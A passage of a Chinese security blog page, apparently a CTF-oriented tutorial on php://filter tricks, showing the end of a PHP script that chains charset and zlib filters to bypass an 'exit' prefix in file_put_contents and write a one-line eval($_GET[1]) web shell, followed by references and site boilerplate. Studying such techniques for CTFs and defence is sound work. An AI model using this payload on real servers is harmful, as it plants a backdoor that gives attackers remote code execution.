+    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
+    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
+    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
+    <span class="hljs-string">&#x27;CP866&#x27;</span>,
+    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
+    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
+    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
+];
+@mkdir(<span class="hljs-string">&#x27;./test&#x27;</span>);
+@chdir(<span class="hljs-string">&#x27;./test&#x27;</span>);
+
+<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
+    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;php://filter/zlib.deflate|&#x27;</span> . <span class="hljs-variable">$item</span> . <span class="hljs-string">&#x27;|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e&#x27;</span>.<span class="hljs-variable">$item</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;
+    file_put_contents(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);
+&#125;
+</code></pre></div>
+
+
+
+
+
+
+
+<h1 id="参考及转载资料"><a href="#参考及转载资料" class="headerlink" title="参考及转载资料"></a>参考及转载资料</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+<li><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">关于file_put_contents的一些小测试</a></li>
+<li><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/">WMctf2020 Checkin出题想法&amp;题解</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+                    
+                      <a class="hover-with-bg" href="/categories/php/">php</a>
+                    
+                      <a class="hover-with-bg" href="/categories/php/%E4%BC%AA%E5%8D%8F%E8%AE%AE/">伪协议</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/php/">php</a>
+                    
+                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+                    
+                      <a class="hover-with-bg" href="/tags/php-filer/">php://filer</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/28/linux-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux 命令执行绕过思路</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/">
+                        <span class="hidden-mobile">域渗透分析工具 BloodHound-基本安装</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https://greydr34d.github.io/2020/10/28/php-filter%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/';
+        this.page.identifier = '/2020/10/28/php-filter%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/';
+      };
+      Fluid.utils.waitElementVisible('disqus_thread', function () {
+        var d = document, s = d.createElement('script');
+        s.src = '//' + '' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
